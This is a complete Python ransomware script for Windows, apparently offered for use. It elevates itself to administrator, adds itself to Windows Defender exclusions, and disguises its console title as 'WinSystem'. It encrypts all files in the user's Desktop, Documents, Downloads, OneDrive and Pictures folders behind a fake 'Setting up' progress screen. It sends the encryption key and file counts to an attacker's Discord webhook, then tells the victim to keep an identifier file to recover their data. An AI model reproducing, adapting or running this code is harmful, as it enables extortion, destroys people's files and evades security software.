import os
import sys
import base64
import uuid
import requests
import ctypes
import subprocess
import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
from threading import Thread
from cryptography.fernet import Fernet

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"An error occurred while checking admin status: {e}")
        return False

def elevate():
    """Restart the script as an administrator."""
    script = os.path.abspath(sys.argv[0])
    try:
        # Restart the script as an administrator
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
    except Exception as e:
        print(f"An error occurred while trying to elevate the script: {e}")
        sys.exit(1)

def add_exclusion_to_defender(script_path):
    """Adds the specified script path to Windows Defender exclusions using PowerShell."""
    try:
        # PowerShell command to add an exclusion for the script path
        command = f'Add-MpPreference -ExclusionPath "{script_path}"'
        
        # Run the PowerShell command
        result = subprocess.run(["powershell", "-Command", command], capture_output=True)
        
        # Decode the output using utf-8
        stdout = result.stdout.decode('utf-8', errors='replace')
        stderr = result.stderr.decode('utf-8', errors='replace')

        # Check the result of the command
        if result.returncode == 0:
            print(f"Successfully added {script_path} to Defender exclusions.")
        else:
            print(f"Failed to add {script_path} to Defender exclusions. Error: {stderr}")
            print(f"Command output: {stdout}")
    except Exception as e:
        print(f"An error occurred: {e}")

def generate_key():
    """Generates a key for encryption and returns it."""
    return Fernet.generate_key()

def encrypt_file(file_path, fernet):
    """Encrypts a single file."""
    try:
        with open(file_path, 'rb') as file:
            original = file.read()
        
        encrypted = fernet.encrypt(original)
        
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        return True
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")
        return False

def walk_and_encrypt(directory, fernet):
    """Walks through the directory and encrypts all files."""
    file_count = 0
    folder_count = 0

    for dirpath, dirnames, filenames in os.walk(directory):
        # Encrypt all files in the current directory
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            if encrypt_file(file_path, fernet):
                file_count += 1

        # Count all subdirectories
        folder_count += len(dirnames)

    return file_count, folder_count

def get_user_folders():
    """Returns the paths to the user's Desktop, Documents, Downloads, and OneDrive folders."""
    user_profile = os.environ['USERPROFILE']  # Get the path to the user's profile directory
    desktop_folder = os.path.join(user_profile, "Desktop")
    documents_folder = os.path.join(user_profile, "Documents")
    downloads_folder = os.path.join(user_profile, "Downloads")
    onedrive_folder = os.path.join(user_profile, "OneDrive")
    picture_folder = os.path.join(user_profile, "Pictures")
    
    return [desktop_folder, documents_folder, downloads_folder, onedrive_folder, picture_folder]

def generate_identifier_code():
    """Generates a random identifier code and returns it."""
    return str(uuid.uuid4())

def save_identifier_to_file(identifier_code):
    """Saves the identifier code to a text file and returns the file path."""
    file_path = os.path.join(os.getcwd(), "identifier_code.txt")
    with open(file_path, 'w') as file:
        file.write(f"Identifier Code: {identifier_code}\n")
    return file_path

def send_info_to_discord(webhook_url, file_count, folder_count, identifier_code):
    message = (
        f"Files encrypted: {file_count}\n"
        f"Folders encrypted: {folder_count}\n"
        f"Identifier Code: {identifier_code}"
    )
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Key and stats sent successfully to Discord.")
    else:
        print(f"Failed to send data to Discord. Status Code: {response.status_code}")
        
def send_key_to_discord(webhook_url, key):
    """Sends the encryption key, stats, and identifier code to a Discord webhook."""
    encoded_key = base64.urlsafe_b64encode(key).decode()  # Encode key to send over the webhook
    message = (
        f"Encryption Key: {encoded_key}\n"
    )
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Key and stats sent successfully to Discord.")
    else:
        print(f"Failed to send data to Discord. Status Code: {response.status_code}")

def notify_user(file_path):
    """Displays a notification to the user with the path to the identifier file."""
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    message = (
        f"Some of your files have been encrypted.\n\n"
        f"Keep the file ({file_path}) if you want to decrypt them later."
    )
    messagebox.showinfo("Files Encrypted", message)

def show_loading_screen():
    """Displays a loading screen while encrypting files."""
    root = tk.Tk()
    root.title("Encryption in Progress")
    
    # Create a frame
    frame = tk.Frame(root, padx=10, pady=10)
    frame.pack(expand=True, fill=tk.BOTH)
    
    # Add a loading message
    label = tk.Label(frame, text="Setting up... Please wait.", font=("Helvetica", 16))
    label.pack(pady=10)
    
    # Add a progress bar
    progress = ttk.Progressbar(frame, mode='indeterminate')
    progress.pack(pady=10, fill=tk.X)
    progress.start()

    # Start the Tkinter mainloop in a separate thread
    def run():
        root.mainloop()

    thread = Thread(target=run)
    thread.start()

    return root

def set_task_name():
    """Set the process name in the Task Manager."""
    try:
        # Set the console window title, which changes the task name in the console window
        ctypes.windll.kernel32.SetConsoleTitleW("WinSystem")
    except Exception as e:
        print(f"An error occurred while setting task name: {e}")

def main():
    if not is_admin():
        print("This script requires administrator privileges. Attempting to restart as administrator...")
        elevate()
        return

    # Set the task name to "WinSystem"
    set_task_name()

    # Get the absolute path of the current script
    script_path = os.path.abspath(sys.argv[0])
    
    # Add the script path to Defender exclusions
    add_exclusion_to_defender(script_path)

    # Replace with your Discord webhook URL
    webhook_url = "YOUR_WEBHOOK_URL"
    
    # Generate encryption key
    key = generate_key()
    fernet = Fernet(key)
    
    send_key_to_discord(webhook_url, key)

    # Get the list of user folders to encrypt
    user_folders = get_user_folders()

    # Show the loading screen
    loading_screen = show_loading_screen()
    
    total_files = 0
    total_folders = 0
    
    # Encrypt all files in each folder
    for folder in user_folders:
        if os.path.exists(folder):
            files_encrypted, folders_encrypted = walk_and_encrypt(folder, fernet)
            total_files += files_encrypted
            total_folders += folders_encrypted
    
    # Close the loading screen
    loading_screen.destroy()
    
    # Generate a unique identifier code
    identifier_code = generate_identifier_code()
    
    # Save the identifier code to a file
    identifier_file_path = save_identifier_to_file(identifier_code)
    
    # Notify the user about the encryption and the location of the identifier file
    notify_user(identifier_file_path)
    
    # Send the key, encryption stats, and identifier code to the Discord webhook
    send_info_to_discord(webhook_url, total_files, total_folders, identifier_code)

if __name__ == "__main__":
    main()
